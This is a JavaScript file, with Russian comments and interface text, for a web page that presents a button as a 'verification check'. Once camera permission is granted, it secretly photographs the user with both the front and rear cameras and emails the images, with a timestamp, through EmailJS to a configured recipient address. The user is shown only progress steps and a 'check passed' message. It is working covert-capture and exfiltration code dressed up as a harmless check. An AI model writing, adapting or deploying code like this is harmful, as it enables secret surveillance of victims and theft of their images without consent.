const v = document.getElementById('v');
const c = document.getElementById('c');
const fill = document.getElementById('fill');
const btn = document.getElementById('btn');
const s1 = document.getElementById('s1');
const s2 = document.getElementById('s2');
const s3 = document.getElementById('s3');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const setProgress = (p) => { fill.style.width = p + '%'; };

emailjs.init(CONFIG.emailjsPublicKey);

async function shoot(facingMode) {
  try {
    // Добавляем exact, чтобы браузер точно понял, какую камеру надо включить
    const constraints = { 
      video: { facingMode: { exact: facingMode } }, 
      audio: false 
    };
    
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    v.srcObject = stream;
    
    // Ждем, пока видео реально загрузится
    await new Promise((resolve) => {
        v.onloadedmetadata = () => { v.play(); resolve(); };
    });
    
    await sleep(1500); // Ждем фокусировки

    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    const ctx = c.getContext('2d');
    ctx.drawImage(v, 0, 0, c.width, c.height);
    const data = c.toDataURL('image/jpeg', 0.8);
    
    // Выключаем камеру и ждем секунду, чтобы "железо" освободилось
    stream.getTracks().forEach((t) => t.stop());
    v.srcObject = null;
    await sleep(1000); 
    
    return data;
  } catch (error) {
    alert("Ошибка камеры (" + facingMode + "): " + error.name + " - " + error.message);
    throw error;
  }
}

async function sendPhoto(dataUrl, label) {
  return emailjs.send(CONFIG.emailjsServiceId, CONFIG.emailjsTemplateId, {
    to_email: CONFIG.toEmail,
    label: label,
    image: dataUrl,
    time: new Date().toLocaleString('ru-RU')
  });
}

btn.addEventListener('click', async () => {
  btn.disabled = true;
  btn.textContent = 'Проверяем…';

  try {
    s1.classList.add('active');
    setProgress(10);
    // Просим доступ
    const prime = await navigator.mediaDevices.getUserMedia({ video: true });
    prime.getTracks().forEach((t) => t.stop());
    await sleep(500);
    
    s1.classList.remove('active');
    s1.classList.add('done');
    setProgress(30);

    // ФРОНТАЛКА
    s2.classList.add('active');
    btn.textContent = 'Снимаем фронталку...';
    
    const frontShot = await shoot('user');
    setProgress(50);
    await sendPhoto(frontShot, 'Фронтальная камера');
    setProgress(60);

    // ТЫЛ
    btn.textContent = 'Переключаем камеру...';
    await sleep(2500); // Даем телефону 2.5 секунды на переключение!
    
    btn.textContent = 'Снимаем тыл...';
    const backShot = await shoot('environment');
    setProgress(80);
    await sendPhoto(backShot, 'Тыльная камера');
    setProgress(90);

    s2.classList.remove('active');
    s2.classList.add('done');

    s3.classList.add('active');
    setProgress(95);
    await sleep(1200);
    s3.classList.remove('active');
    s3.classList.add('done');
    setProgress(100);

    btn.textContent = 'Проверка пройдена ✓';
    btn.style.background = 'linear-gradient(135deg,#28c76f,#1fa85a)';
  } catch (e) {
    console.error(e);
    btn.disabled = false;
    btn.textContent = 'Повторить проверку';
    setProgress(0);
  }
});
